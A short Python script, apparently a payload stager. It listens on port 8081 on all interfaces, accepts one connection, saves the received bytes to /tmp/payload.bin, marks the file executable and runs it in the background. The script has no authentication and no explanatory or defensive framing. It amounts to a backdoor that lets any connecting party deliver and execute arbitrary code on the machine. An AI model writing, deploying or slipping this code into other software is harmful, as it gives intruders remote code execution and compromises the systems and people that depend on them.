import socket
import subprocess

s = socket.socket()

s.bind(('0.0.0.0', 8081))
s.listen(1)

sc, _ = s.accept()
sc.settimeout(5)

f = open('/tmp/payload.bin', 'wb+'); 
while 1:
    try:
        f.write(sc.recv(1024))
    except:
        break

f.close()
sc.close()
s.close()

subprocess.call('chmod +x /tmp/payload.bin', shell=True)
subprocess.call('/tmp/payload.bin &', shell=True)
